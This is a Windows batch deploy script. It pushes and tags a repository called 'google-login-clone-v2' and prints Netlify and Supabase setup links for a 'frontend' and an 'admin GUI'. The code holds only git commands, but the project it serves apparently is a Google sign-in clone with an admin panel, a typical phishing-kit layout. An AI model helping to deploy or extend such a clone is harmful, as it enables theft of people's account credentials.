@echo off
echo ========================================
echo  QUICK DEPLOY - VERSION 2.1
echo ========================================

echo [1/4] Pushing to GitHub...
git push -u origin master

if errorlevel 1 (
    echo ❌ FAILED TO PUSH! Repository may not exist yet.
    echo 👆 CREATE REPO FIRST: https://github.com/new
    echo Repository name: google-login-clone-v2
    pause
    exit /b 1
)

echo [2/4] Creating release tag...
git tag -a v2.1-final -m "Version 2.1 Final - Auto-Login + Country Detection"
git push origin v2.1-final

echo [3/4] ✅ GITHUB DEPLOYED!
echo Repository: https://github.com/tigerads1998/google-login-clone-v2

echo [4/4] Next steps:
echo ========================================
echo  NETLIFY DEPLOYMENT LINKS
echo ========================================
echo.
echo 🌐 FRONTEND V2:
echo https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/google-login-clone-v2
echo.
echo   Settings:
echo   - Site name: google-clone-v2-auto-login
echo   - Publish directory: google-login-clone
echo.
echo 🌐 ADMIN GUI V2:
echo https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/google-login-clone-v2
echo.
echo   Settings:
echo   - Site name: admin-gui-v2-auto-login  
echo   - Publish directory: admin-gui
echo.
echo 💾 SUPABASE:
echo https://supabase.com/dashboard/project/otbswtklpidhezziotac
echo Copy code from: configs/SUPABASE_COMPLETE_SETUP_V2.md
echo.
echo ========================================
echo  🎉 READY FOR NETLIFY + SUPABASE!
echo ========================================

pause 